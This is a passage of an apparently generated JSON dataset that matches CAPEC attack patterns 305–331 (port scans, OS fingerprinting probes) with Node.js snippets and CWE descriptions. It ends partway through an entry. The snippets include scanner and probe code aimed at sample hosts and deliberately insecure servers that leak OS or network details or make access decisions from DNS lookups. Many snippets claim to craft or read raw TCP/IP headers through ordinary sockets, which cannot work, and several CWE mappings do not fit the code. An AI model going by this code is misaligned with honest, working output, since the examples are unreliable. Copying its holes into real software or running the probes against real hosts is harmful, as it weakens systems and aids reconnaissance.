        "code_snippet": "const net = require('net');\n\nfunction tcpAckScan(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    const ackPacket = Buffer.from('4500003c1c4640004006b1e6c0a80001c0a80002', 'hex');\n    client.write(ackPacket);\n  });\n\n  client.on('data', (data) => {\n    console.log('Received:', data.toString('hex'));\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error('Error:', err.message);\n  });\n}\n\ntcpAckScan('192.168.0.1', 80);",
        "description": "This JavaScript code snippet demonstrates a basic TCP ACK scan using Node.js. The `tcpAckScan` function attempts to connect to a specified target and port, then sends a crafted TCP ACK packet. The response is logged, which can reveal information about the firewall or ACL configuration. This scan can help identify how a firewall handles ACK packets, potentially exposing sensitive information about the network's security configuration (CWE-200). The code also highlights the risk of transmitting sensitive data in cleartext (CWE-319) and the importance of proper access control (CWE-1280, CWE-529)."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "const net = require('net');\n\nfunction tcpWindowScan(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    client.write('GET / HTTP/1.1\\r\\nHost: ' + target + '\\r\\n\\r\\n');\n  });\n\n  client.on('data', (data) => {\n    const windowSize = data.readUInt16BE(14); // Extract TCP Window Size from the TCP header\n    console.log(`Window Size: ${windowSize}`);\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n  });\n}\n\ntcpWindowScan('example.com', 80);",
        "description": "This JavaScript code snippet demonstrates a basic TCP Window Scan using Node.js. The function `tcpWindowScan` connects to a specified target and port, sends a simple HTTP GET request, and then reads the TCP Window Size from the response. The window size is extracted from the TCP header and logged to the console. This scan can help infer information about the target's operating system and port status based on the window size values. The code embodies the CAPEC concept by performing a TCP Window Scan and highlights CWE-200 (Exposure of Sensitive Information) and CWE-497 (Exposure of Sensitive System Information) as it potentially reveals system-level information to unauthorized actors."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "const net = require('net');\nconst rpcPort = 111; // Common RPC port\n\nconst client = new net.Socket();\nclient.connect(rpcPort, 'target-host', () => {\n  console.log('Connected to RPC service');\n  client.write('RPC request data'); // CWE-200: Potential exposure of sensitive information\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // CWE-294: Replay attack potential\n  client.write(data); // Replay the received data\n});\n\nclient.on('error', (err) => {\n  console.error('Connection error:', err);\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP RPC scan on a Unix/Linux host. It connects to a common RPC port (111) on a target host and sends a request. The code listens for data from the server and replays it back, illustrating a potential capture-replay attack (CWE-294). Additionally, the initial request may expose sensitive information (CWE-200). The code highlights the risks associated with scanning for and interacting with RPC services, which can lead to unauthorized access and exploitation."
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  console.log(`Server got: ${msg} from ${rinfo.address}:${rinfo.port}`);\n  // Respond with sensitive information in cleartext\n  const response = 'Sensitive data: User credentials';\n  server.send(response, rinfo.port, rinfo.address, (err) => {\n    if (err) console.error('Error sending response:', err);\n  });\n});\n\nserver.on('error', (err) => {\n  console.error(`Server error:\n${err.stack}`);\n  server.close();\n});\n\nserver.bind(41234); // Bind to a specific port\n\nconsole.log('UDP server listening on port 41234');",
        "description": "This JavaScript code snippet creates a simple UDP server using the 'dgram' module. The server listens for incoming UDP datagrams on port 41234. When a message is received, it logs the message and the sender's information, then responds with a message containing sensitive information in cleartext. This demonstrates the CAPEC concept of UDP scanning, where an adversary can send UDP datagrams to gather information about the target system. The code also embodies several related CWEs: it exposes sensitive information to unauthorized actors (CWE-200), transmits sensitive data in cleartext (CWE-319), and lacks integrity checks for the transmitted data (CWE-353)."
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "const http = require('http');\nconst os = require('os');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/network-info') {\n    const networkInterfaces = os.networkInterfaces();\n    res.writeHead(200, {'Content-Type': 'application/json'});\n    res.end(JSON.stringify(networkInterfaces));\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. When a request is made to the '/network-info' endpoint, the server responds with detailed network interface information of the host machine. This information includes IP addresses, MAC addresses, and other network-related details. The code demonstrates the concept of 'Network Topology Mapping' (CAPEC) by exposing sensitive network information. The related CWEs are represented as follows:\n- CWE-200: The network information is exposed to any unauthorized actor who accesses the '/network-info' endpoint.\n- CWE-497: Sensitive system-level information (network interfaces) is accessible to unauthorized users.\n- CWE-1125: The server has an excessive attack surface by exposing detailed network information.\nThis code snippet highlights the risks associated with exposing sensitive network information, which can be exploited by adversaries for network reconnaissance."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "const net = require('net');\nconst sensitiveData = 'username=admin&password=admin123';\n\nconst scanPorts = (host, ports) => {\n  ports.forEach(port => {\n    const socket = new net.Socket();\n    socket.setTimeout(2000);\n    socket.on('connect', () => {\n      console.log(`Port ${port} is open on ${host}`);\n      socket.write(sensitiveData);\n      socket.end();\n    }).on('timeout', () => {\n      socket.destroy();\n    }).on('error', (err) => {\n      console.log(`Port ${port} is closed on ${host}: ${err.message}`);\n    }).connect(port, host);\n  });\n};\n\nconst targetHost = '192.168.1.1';\nconst targetPorts = [21, 23, 25, 161]; // FTP, Telnet, SMTP, SNMP\nscanPorts(targetHost, targetPorts);",
        "description": "This JavaScript code snippet demonstrates a basic port scanning activity, which is a common initial step in identifying vulnerable software on a target network. The `scanPorts` function attempts to connect to a list of specified ports on a target host. If a connection is successful, it logs that the port is open and sends sensitive data in cleartext, representing CWE-319 (Cleartext Transmission of Sensitive Information). The code also highlights CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by attempting to expose sensitive data and system information through open ports. The use of common service ports (FTP, Telnet, SMTP, SNMP) aligns with the CAPEC description of scanning for vulnerable software versions or types."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "const http = require('http');\nconst os = require('os');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/os-info') {\n    // Potentially exposing sensitive OS information\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`OS Type: ${os.type()}\nOS Platform: ${os.platform()}\nOS Release: ${os.release()}`);\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. When a request is made to the '/os-info' endpoint, the server responds with detailed information about the operating system, such as the OS type, platform, and release version. This represents the concept of OS fingerprinting (CAPEC-312 and CAPEC-313), where an attacker can gather information about the operating system to identify potential vulnerabilities. The code also touches on CWE-532 (Information Exposure Through Debug Log Files) by potentially exposing sensitive OS information, and CWE-287 (Authentication Bypass Issues) by not implementing any authentication mechanism to restrict access to the '/os-info' endpoint."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
        "code_snippet": "const net = require('net');\n\nconst probePacket = Buffer.from([0x45, 0x00, 0x00, 0x3c, 0x1c, 0x46, 0x40, 0x00, 0x40, 0x06, 0xb1, 0xe6, 0xc0, 0xa8, 0x00, 0x68, 0xc0, 0xa8, 0x00, 0x01]);\n\nconst client = new net.Socket();\nclient.connect(80, '192.168.0.1', () => {\n  client.write(probePacket);\n});\n\nclient.on('data', (data) => {\n  console.log('Received:', data.toString('hex'));\n  client.destroy();\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a basic example of active OS fingerprinting. It uses the 'net' module to create a TCP connection to a target IP address (192.168.0.1) on port 80. The 'probePacket' is a crafted packet designed to elicit a response from the target that can reveal information about its operating system. When the target responds, the data is logged in hexadecimal format, which can be analyzed to determine the OS type and version. This code embodies the CAPEC concept by sending anomalous input to the target and observing its unique response, which can expose sensitive system information (CWE-497) and potentially transmit sensitive data in cleartext (CWE-319)."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Log the incoming data for passive OS fingerprinting\n    console.log(`Received data: ${data.toString()}`);\n    \n    // Simulate analysis of the data to identify OS\n    const osSignature = identifyOS(data.toString());\n    console.log(`Identified OS: ${osSignature}`);\n  });\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server listening on port 8080');\n});\n\nfunction identifyOS(data) {\n  // Dummy function to simulate OS identification\n  if (data.includes('Windows')) return 'Windows';\n  if (data.includes('Linux')) return 'Linux';\n  return 'Unknown OS';\n}",
        "description": "This JavaScript code snippet creates a simple TCP server using the 'net' module. The server listens for incoming data on port 8080. When data is received, it logs the data and simulates the identification of the operating system based on the content of the data. This represents passive OS fingerprinting, where the server passively monitors communication to identify the OS without sending any probes. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200, CWE-497) and transmitting data in cleartext (CWE-319)."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nhttp.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  dns.reverse(clientIP, (err, hostnames) => {\n    if (err) {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Internal Server Error');\n      return;\n    }\n\n    if (hostnames.includes('trusted.example.com')) {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Access Granted');\n    } else {\n      res.writeHead(403, {'Content-Type': 'text/plain'});\n      res.end('Access Denied');\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that performs a DNS reverse lookup on the client's IP address to make an access control decision. If the client's IP address resolves to 'trusted.example.com', access is granted; otherwise, access is denied. This code embodies the deprecated CAPEC-312 (Active OS Fingerprinting) by attempting to identify the client's system based on its IP address. It also touches on CWE-247 (Reliance on DNS Lookups in a Security Decision), which is deprecated but relevant here as the code relies on DNS lookups for security decisions. This approach is vulnerable because DNS lookups can be spoofed, leading to potential security bypasses."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "const net = require('net');\nconst crypto = require('crypto');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Simulate a capture-replay vulnerability\n    const receivedHash = data.toString();\n    const expectedHash = crypto.createHash('sha256').update('secret').digest('hex');\n\n    if (receivedHash === expectedHash) {\n      socket.write('Authentication successful');\n    } else {\n      socket.write('Authentication failed');\n    }\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\n\n// Client code to simulate replay attack\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  const hash = crypto.createHash('sha256').update('secret').digest('hex');\n  client.write(hash); // Replay the hash\n});\n\nclient.on('data', (data) => {\n  console.log('Server response: ' + data.toString());\n  client.destroy(); // Close the connection\n});",
        "description": "This JavaScript code snippet demonstrates a basic TCP server and client setup using the 'net' module. The server listens for incoming data and performs a simple hash comparison to authenticate the client. The client connects to the server and sends a precomputed hash. This setup embodies the concept of a capture-replay vulnerability (CWE-294), where an attacker can capture the hash and replay it to bypass authentication. The code also indirectly touches on the deprecated CWE-592 by showing a simplistic and flawed authentication mechanism. The main idea is to highlight how improper handling of authentication data can lead to security vulnerabilities."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nhttp.createServer((req, res) => {\n  const hostname = req.headers['host'];\n  dns.lookup(hostname, (err, address) => {\n    if (err) {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Internal Server Error');\n      return;\n    }\n    if (address === '127.0.0.1') { // Vulnerable reliance on DNS lookup\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Access Granted');\n    } else {\n      res.writeHead(403, {'Content-Type': 'text/plain'});\n      res.end('Access Denied');\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that relies on DNS lookups to make security decisions, which is a deprecated and vulnerable practice (CWE-247, now CWE-350). The server checks the hostname from the request headers and performs a DNS lookup. If the resolved address is '127.0.0.1', it grants access; otherwise, it denies access. This approach is insecure because DNS lookups can be spoofed, leading to potential security bypasses. The code represents the deprecated CAPEC pattern of using unreliable methods for security decisions, highlighting the risks associated with such practices."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst targetHost = '192.168.1.1';\nconst targetPort = 12345;\n\nlet previousId = null;\n\nclient.on('message', (msg, rinfo) => {\n  const ipId = msg.readUInt16BE(4); // Read the IP ID field from the packet\n  if (previousId !== null) {\n    console.log(`IP ID: ${ipId}, Difference: ${ipId - previousId}`);\n  } else {\n    console.log(`IP ID: ${ipId}`);\n  }\n  previousId = ipId;\n});\n\nconst message = Buffer.from('Hello');\n\nsetInterval(() => {\n  client.send(message, 0, message.length, targetPort, targetHost, (err) => {\n    if (err) console.error(err);\n  });\n}, 1000);",
        "description": "This JavaScript code snippet uses the 'dgram' module to create a UDP client that sends packets to a target host and port. It listens for responses and extracts the IP ID field from the received packets. By logging the IP ID and the difference between consecutive IP IDs, the code demonstrates how an attacker might analyze the IP ID sequence generation algorithm of a remote host. This can help identify the operating system of the host, as different OS implementations generate IP IDs differently. The code embodies the main idea of the CAPEC 'IP ID Sequencing Probe' by showing how to probe and analyze IP ID sequences. The related CWEs provide context on potential vulnerabilities, such as exposure of sensitive information (CWE-200) and reliance on IP address for authentication (CWE-291), which can be exploited through such probing techniques."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('Hello');\nconst ipID = 12345; // Arbitrary IP ID value\n\nclient.on('message', (msg, rinfo) => {\n  const echoedIPID = msg.readUInt16BE(4); // Read the echoed IP ID from the ICMP error message\n  if (echoedIPID === ipID) {\n    console.log('IP ID echoed back correctly');\n  } else {\n    console.log('IP ID not echoed back correctly');\n  }\n  client.close();\n});\n\nclient.send(message, 0, message.length, 12345, '192.168.1.1', (err) => {\n  if (err) throw err;\n  console.log('UDP message sent');\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of an IP 'ID' Echoed Byte-Order Probe. It sends a UDP datagram with an arbitrary IP 'ID' value to a closed port on a remote host. The code listens for an ICMP error message in response and checks if the IP 'ID' value is echoed back correctly. This can be used to fingerprint the operating system of the remote host. The code also touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes the IP 'ID' value, and CWE-1290 (Incorrect Decoding of Security Identifiers) as it involves reading and interpreting the IP 'ID' from the response."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('');\nconst options = {\n  address: '192.168.1.1', // Target IP address\n  port: 12345, // Closed port\n  df: true // Set the Don't Fragment (DF) bit\n};\n\nclient.send(message, 0, message.length, options.port, options.address, (err) => {\n  if (err) throw err;\n  console.log('UDP message sent with DF bit set');\n});\n\nclient.on('message', (msg, rinfo) => {\n  const dfBitSet = (msg.readUInt8(6) & 0x40) !== 0;\n  console.log(`Received response from ${rinfo.address}:${rinfo.port} with DF bit ${dfBitSet ? 'set' : 'not set'}`);\n  client.close();\n});",
        "description": "This JavaScript code snippet demonstrates a UDP client that sends a datagram to a specified IP address and port with the 'Don't Fragment' (DF) bit set. The code then listens for a response and checks if the DF bit is echoed back in the response packet. This embodies the main idea of the CAPEC 'IP (DF) 'Don't Fragment Bit' Echoing Probe', which is used for OS fingerprinting by observing the behavior of the DF bit in response packets. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200) and incorrectly specifying communication channels (CWE-941)."
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "const net = require('net');\n\nconst options = {\n  host: 'target.server.com',\n  port: 80\n};\n\nconst client = net.createConnection(options, () => {\n  console.log('Connected to server');\n  client.write('GET / HTTP/1.1\\r\\nHost: target.server.com\\r\\n\\r\\n');\n});\n\nclient.on('data', (data) => {\n  const tcpOptions = data.toString('hex').match(/0101080a([0-9a-f]{8})([0-9a-f]{8})/);\n  if (tcpOptions) {\n    const timestamp = parseInt(tcpOptions[1], 16);\n    console.log(`TCP Timestamp: ${timestamp}`);\n  }\n  client.end();\n});\n\nclient.on('end', () => {\n  console.log('Disconnected from server');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP timestamp probe, which is used for OS fingerprinting by examining the TCP timestamps in the response from a target server. The code establishes a TCP connection to a specified server and sends an HTTP GET request. Upon receiving the response, it extracts the TCP timestamp from the TCP options field in the header. This timestamp can be used to infer the operating system of the target based on how different OSes update the timestamp value. This embodies the CAPEC's main idea of using TCP timestamps for OS fingerprinting. The related CWEs provide context on potential vulnerabilities, such as exposure of sensitive information (CWE-200) and cleartext transmission (CWE-319), which can be exploited during this process."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "const net = require('net');\n\nfunction generatePredictableSequenceNumber(ackNumber) {\n  // CWE-337: Predictable Seed in PRNG\n  const seed = ackNumber; // Using ackNumber as seed (predictable)\n  return (seed + 1) % 4294967296; // Simple predictable sequence number generation\n}\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const ackNumber = data.readUInt32BE(0); // Read the ACK number from the probe packet\n    const sequenceNumber = generatePredictableSequenceNumber(ackNumber);\n    const response = Buffer.alloc(4);\n    response.writeUInt32BE(sequenceNumber, 0);\n    socket.write(response); // CWE-319: Cleartext Transmission of Sensitive Information\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates a TCP server that listens on port 8080. When it receives data, it reads the acknowledgment number from the incoming packet and generates a predictable sequence number based on this acknowledgment number. The sequence number is then sent back to the client in cleartext. This code embodies the main idea of the CAPEC 'TCP Sequence Number Probe' by demonstrating how an attacker can probe a system to determine its TCP sequence number generation pattern. The use of a predictable seed (CWE-337) and cleartext transmission (CWE-319) are highlighted as vulnerabilities that can be exploited for OS fingerprinting and other attacks."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "const net = require('net');\n\nfunction sendSynPacket(targetHost, targetPort) {\n  const client = new net.Socket();\n  client.connect(targetPort, targetHost, () => {\n    console.log('Connected to target');\n    client.write('SYN'); // Simulate sending a SYN packet\n  });\n\n  client.on('data', (data) => {\n    console.log('Received:', data.toString());\n    analyzeISN(data);\n    client.destroy(); // Close the connection\n  });\n\n  client.on('error', (err) => {\n    console.error('Connection error:', err.message);\n  });\n}\n\nfunction analyzeISN(data) {\n  // Extract and analyze the ISN from the SYN/ACK response\n  const isn = extractISN(data);\n  console.log('Extracted ISN:', isn);\n  // Compare ISN against known OS behaviors (simplified)\n  const osType = identifyOSType(isn);\n  console.log('Identified OS Type:', osType);\n}\n\nfunction extractISN(data) {\n  // Placeholder function to extract ISN from data\n  return data.slice(0, 4); // Simplified extraction\n}\n\nfunction identifyOSType(isn) {\n  // Placeholder function to identify OS type based on ISN\n  const osDatabase = {\n    '1234': 'Linux',\n    '5678': 'Windows',\n    '9101': 'MacOS'\n  };\n  return osDatabase[isn] || 'Unknown';\n}\n\nsendSynPacket('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'TCP (ISN) Greatest Common Divisor Probe' attack. It sends a TCP SYN packet to a target host and port, receives the SYN/ACK response, and extracts the Initial Sequence Number (ISN) from the response. The ISN is then analyzed to identify the operating system of the target host by comparing it against a predefined database of known OS behaviors. This process embodies the main idea of the CAPEC by leveraging the ISN to fingerprint the OS. The code also touches on related CWEs by potentially exposing sensitive system information (CWE-497) and transmitting data that could be intercepted (CWE-319)."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "const net = require('net');\n\nfunction getISNRate(host, port, duration) {\n  let startTime = Date.now();\n  let isnIncrements = [];\n  let lastISN = null;\n\n  const client = new net.Socket();\n  client.connect(port, host, () => {\n    console.log('Connected');\n  });\n\n  client.on('data', (data) => {\n    let isn = parseISN(data);\n    if (lastISN !== null) {\n      isnIncrements.push(isn - lastISN);\n    }\n    lastISN = isn;\n  });\n\n  setTimeout(() => {\n    client.destroy();\n    let totalIncrements = isnIncrements.reduce((a, b) => a + b, 0);\n    let rate = totalIncrements / isnIncrements.length;\n    console.log(`Average ISN increment rate: ${rate}`);\n  }, duration);\n}\n\nfunction parseISN(data) {\n  // Dummy function to parse ISN from TCP packet data\n  return parseInt(data.toString('hex').slice(0, 8), 16);\n}\n\ngetISNRate('example.com', 80, 10000);",
        "description": "This JavaScript code snippet demonstrates a TCP Initial Sequence Number (ISN) counter rate probe. It connects to a specified host and port, captures TCP packets, and calculates the average rate of ISN increments over a given duration. The `getISNRate` function establishes a TCP connection, listens for incoming data, and extracts the ISN from each packet. It then calculates the difference between consecutive ISNs to determine the increment rate. After the specified duration, it computes and logs the average ISN increment rate. This code embodies the concept of measuring ISN increments to infer information about the operating system, as described in the CAPEC. The related CWEs highlight potential vulnerabilities such as exposure of sensitive information (CWE-200) and race conditions (CWE-367, CWE-362) that could be exploited in such a scenario."
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "const crypto = require('crypto');\n\nfunction generateISN() {\n  // Predictable seed based on current time\n  const seed = Date.now();\n  const random = crypto.createHash('sha256').update(seed.toString()).digest('hex');\n  // Convert hex to integer\n  const isn = parseInt(random.substring(0, 8), 16);\n  return isn;\n}\n\nconsole.log('Generated ISN:', generateISN());",
        "description": "This JavaScript code snippet demonstrates the generation of an Initial Sequence Number (ISN) for a TCP connection using a predictable seed. The seed is based on the current time (Date.now()), which is a common but predictable source. The code uses the crypto module to create a SHA-256 hash of the seed and then converts a portion of the hash to an integer to serve as the ISN. This approach embodies the CAPEC concept of 'TCP (ISN) Sequence Predictability Probe' by illustrating how an attacker could predict the sequence number generation algorithm if the seed is predictable. The related CWEs are represented as follows: CWE-337 (Predictable Seed in PRNG) is shown by using the current time as the seed, CWE-341 (Predictable from Observable State) is demonstrated by the use of a time-based seed, and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) is implied as the predictability of the ISN could expose the system to unauthorized access."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nconst ECN_FLAG = 0x01; // Example ECN flag\n\nclient.connect(80, 'example.com', () => {\n  console.log('Connected to server');\n  // Send a packet with ECN flag\n  const packet = Buffer.from([ECN_FLAG]);\n  client.write(packet);\n});\n\nclient.on('data', (data) => {\n  console.log('Received:', data.toString());\n  // Check for sensitive information in response\n  if (data.includes('sensitive')) {\n    console.log('Sensitive information exposed!');\n  }\n  client.destroy(); // Close the connection\n});\n\nclient.on('error', (err) => {\n  console.error('Connection error:', err.message);\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a server and sends a packet with an ECN (Explicit Congestion Notification) flag. The code aims to probe the server's response to the ECN flag, which can be used for OS fingerprinting. The client listens for incoming data and checks if any sensitive information is exposed in the response. This embodies the CAPEC's main idea of probing for ECN support and highlights potential vulnerabilities such as exposure of sensitive information (CWE-200), improper protection for outbound messages (CWE-1320), and cleartext transmission of sensitive information (CWE-319)."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "const net = require('net');\n\nfunction probeInitialWindowSize(targetIP, targetPort) {\n  const client = new net.Socket();\n  client.connect(targetPort, targetIP, () => {\n    console.log('Connected to target');\n    const initialWindowSize = client._readableState.highWaterMark;\n    console.log(`Initial TCP Window Size: ${initialWindowSize}`);\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Connection error: ${err.message}`);\n  });\n}\n\n// Example usage\nprobeInitialWindowSize('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP Initial Window Size Probe, which is used for OS fingerprinting by checking the initial TCP window size of a target system. The code establishes a TCP connection to a specified target IP and port, retrieves the initial window size from the socket's readable state, and logs it. This information can be used to infer the operating system of the target. The code also handles connection errors. This snippet embodies the CAPEC concept by probing the initial TCP window size, and it touches on CWE-200 (Exposure of Sensitive Information) as it reveals potentially sensitive information about the target system's OS."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Extract TCP options from the incoming packet\n    const tcpOptions = extractTCPOptions(data);\n    console.log('Received TCP options:', tcpOptions);\n\n    // Simulate exposure of sensitive information\n    if (tcpOptions.includes('sensitiveOption')) {\n      console.log('Sensitive information exposed:', tcpOptions);\n    }\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\nfunction extractTCPOptions(data) {\n  // Dummy function to simulate extraction of TCP options\n  // In a real scenario, this would parse the TCP header to extract options\n  return ['option1', 'sensitiveOption', 'option3'];\n}",
        "description": "This JavaScript code snippet creates a TCP server using Node.js that listens for incoming connections on port 8080. When data is received, it extracts TCP options from the incoming packet. The `extractTCPOptions` function is a placeholder that simulates the extraction of TCP options from the TCP header. If the extracted options include a 'sensitiveOption', it logs that sensitive information has been exposed. This code embodies the main idea of the CAPEC 'TCP Options Probe' by analyzing TCP header options and demonstrates CWE-200 (Exposure of Sensitive Information) by logging sensitive information if certain TCP options are present."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(80, 'example.com', () => {\n  console.log('Connected');\n  // Sending a RST packet with a text payload\n  const rstPacket = Buffer.from('HTTP/1.1 400 Bad Request\\r\\n\\r\\n');\n  client.write(rstPacket);\n  client.destroy(); // Close the connection\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy(); // Close the connection\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet uses the 'net' module to create a TCP client that connects to a server on port 80. Upon connection, it sends a packet that mimics a TCP RST (reset) packet with a human-readable text payload ('HTTP/1.1 400 Bad Request'). This simulates the CAPEC scenario where an attacker sends a RST packet with a text payload to probe for OS fingerprinting. The code also listens for any data received from the server and logs it, then closes the connection. This example embodies the CAPEC by demonstrating how an attacker might exploit the lack of integrity checks (CWE-353, CWE-354) and the transmission of sensitive information in cleartext (CWE-319) to gather information about the target system."
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  console.log(`Server got: ${msg} from ${rinfo.address}:${rinfo.port}`);\n  // Simulate an ICMP error message with sensitive information\n  const errorMessage = `ICMP Error: Port Unreachable. Original message: ${msg.toString()}`;\n  console.log(errorMessage); // CWE-209: Generation of Error Message Containing Sensitive Information\n  // Send back the error message\n  server.send(errorMessage, rinfo.port, rinfo.address, (err) => {\n    if (err) console.error('Error sending message:', err);\n  });\n});\n\nserver.on('error', (err) => {\n  console.error(`Server error:\n${err.stack}`);\n  server.close();\n});\n\nserver.bind(41234);",
        "description": "This JavaScript code snippet creates a UDP server using the 'dgram' module. When the server receives a message, it logs the message and the sender's address and port. It then simulates an ICMP error message (Port Unreachable) that includes the original message content, which is a sensitive information exposure (CWE-209). The error message is sent back to the sender. This demonstrates the CAPEC concept of generating an ICMP error message and quoting the original request, potentially exposing sensitive information."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  console.log(`Server got: ${msg} from ${rinfo.address}:${rinfo.port}`);\n  // Simulate an ICMP error message with sensitive information\n  const errorMessage = `ICMP Error: Destination Unreachable. Original message: ${msg}`;\n  server.send(errorMessage, rinfo.port, rinfo.address, (err) => {\n    if (err) console.error('Error sending message:', err);\n  });\n});\n\nserver.on('error', (err) => {\n  console.error(`Server error:\n${err.stack}`);\n  server.close();\n});\n\nserver.bind(41234, () => {\n  console.log('Server listening on port 41234');\n});",
        "description": "This JavaScript code snippet creates a UDP server using the 'dgram' module. The server listens for incoming messages and simulates an ICMP error message response that includes the original message content. This demonstrates the CAPEC concept of generating an ICMP error message and echoing back the original request data, potentially exposing sensitive information (CWE-200, CWE-211). The code also lacks integrity checks (CWE-353), making it vulnerable to capture-replay attacks (CWE-294). The error message handling could expose sensitive information (CWE-210)."
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
